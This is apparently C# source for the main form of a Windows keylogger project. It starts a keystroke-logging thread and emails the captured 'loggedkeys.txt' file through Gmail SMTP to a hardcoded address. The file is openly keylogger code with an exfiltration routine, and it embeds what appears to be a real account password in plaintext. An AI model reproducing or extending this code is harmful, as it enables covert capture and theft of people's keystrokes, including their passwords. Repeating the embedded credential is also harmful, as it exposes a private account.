using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Threading;


namespace Keyloggerr
{

    public partial class Form1 : Form
    {
        KeyLogger _keylogger = new KeyLogger();
        BackgroundWorker workerThread = null;
        bool _keepRunning = false;
        public Form1()
        {
            InitializeComponent();
            InstantiateWorkerThread();
        }
        private void InstantiateWorkerThread()
        {
            workerThread = new BackgroundWorker();
            workerThread.ProgressChanged += WorkerThread_ProgressChanged;
            workerThread.DoWork += WorkerThread_DoWork;
            workerThread.RunWorkerCompleted += WorkerThread_RunWorkerCompleted;
            workerThread.WorkerReportsProgress = true;
            workerThread.WorkerSupportsCancellation = true;
        }

        private void WorkerThread_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            lblStopWatch.Text = e.UserState.ToString();
        }

        private void WorkerThread_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Cancelled)
            {
                lblStopWatch.Text = "Cancelled";
            }
            else
            {
                lblStopWatch.Text = "Stopped";
            }
        }

        private void WorkerThread_DoWork(object sender, DoWorkEventArgs e)
        {
            DateTime startTime = DateTime.Now;

            _keepRunning = true;

            while (_keepRunning)
            {
                Thread.Sleep(1000);

                string timeElapsedInstring = (DateTime.Now - startTime).ToString(@"hh\:mm\:ss");

                workerThread.ReportProgress(0, timeElapsedInstring);

                if (workerThread.CancellationPending)
                {
                    // this is important as it set the cancelled property of RunWorkerCompletedEventArgs to true
                    e.Cancel = true;
                    break;
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //SendMail
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("carceapaul9@gmail.com");
                mail.To.Add("carceapaul9@gmail.com");
                mail.Subject = "Test Mail";
                mail.Body = "LoggedKeys";
                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment("c:/Users/Paul/source/repos/Keyloggerr/Keyloggerr/bin/x86/Debug/loggedkeys.txt");
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("carceapaul9@gmail.com", "nanerespectatA2");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                MessageBox.Show("mail Send");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //Start
            workerThread.RunWorkerAsync();
            _keylogger.StartThread();

        }


        private void button3_Click(object sender, EventArgs e)
        {
            _keepRunning = false;
            _keylogger.PauseThread();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            workerThread.CancelAsync();
        }
    }
}
